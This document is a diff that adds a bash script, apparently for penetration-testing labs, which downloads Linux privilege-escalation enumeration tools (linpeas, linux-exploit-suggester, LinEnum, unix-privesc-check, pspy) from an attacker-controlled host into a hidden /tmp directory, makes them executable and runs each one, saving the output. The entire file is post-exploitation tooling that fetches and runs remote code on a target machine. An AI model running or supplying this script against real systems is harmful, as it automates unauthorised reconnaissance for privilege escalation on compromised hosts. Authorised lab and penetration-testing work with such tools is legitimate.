@@ -1,0 +1,64 @@
+#!/bin/bash
+# author: WatchDogOblivion
+# description: TODO
+# WatchDogs Escalation Scans a.k.a wescans
+
+lHost="192.168.119.x"
+lPort=80
+SCRIPTS_PATH="/scans"
+SCRIPTS=("linpeas.sh" "les.sh" "LinEnum.sh" "unix-privesc-check" "pspy64s")
+SCRIPTS_ARGS=("" "" "" "detailed" "")
+DOWNLOAD_DIRECTORY="/tmp/.scans"
+TIMEOUT="5m"
+
+process() {
+    flag=$1
+    fullPath=$DOWNLOAD_DIRECTORY$2
+    for index in "${!SCRIPTS[@]}"; do
+        script=${SCRIPTS[$index]}
+        scriptArg=${SCRIPTS_ARGS[$index]}
+        case $flag in
+        -wget)
+            wget $lHost:$lPort$SCRIPTS_PATH/$script -O $fullPath/$script
+            ;;
+        -chmod)
+            chmod 777 $fullPath/$script
+            ;;
+        -run)
+            echo "Starting $script"
+            timeout $TIMEOUT $fullPath/$script $scriptArg >$fullPath/$script.ans
+            echo "Finished executing $script"
+            ;;
+        *)
+            printf "\nUnknown flag $flag\n"
+            ;;
+        esac
+    done
+}
+
+main() {
+    mkdir $DOWNLOAD_DIRECTORY
+
+    getEachScript=$1
+    if [ -z "$getEachScript" ]; then
+        getEachScript="false"
+    fi
+
+    if [ ${getEachScript,,} == "true" ]; then
+        process -wget
+        process -chmod
+        process -run
+    else
+        wget $lHost:$lPort$SCRIPTS_PATH -r -np -P $DOWNLOAD_DIRECTORY
+
+        scriptDirectory=$(echo $SCRIPTS_PATH | sed -E 's;.*(/.*);\1;')
+        mv $DOWNLOAD_DIRECTORY/$lHost$scriptDirectory $DOWNLOAD_DIRECTORY$scriptDirectory
+        rm -r $DOWNLOAD_DIRECTORY/$lHost
+
+        process -wget $scriptDirectory
+        process -chmod $scriptDirectory
+        process -run $scriptDirectory
+    fi
+}
+
+main $@
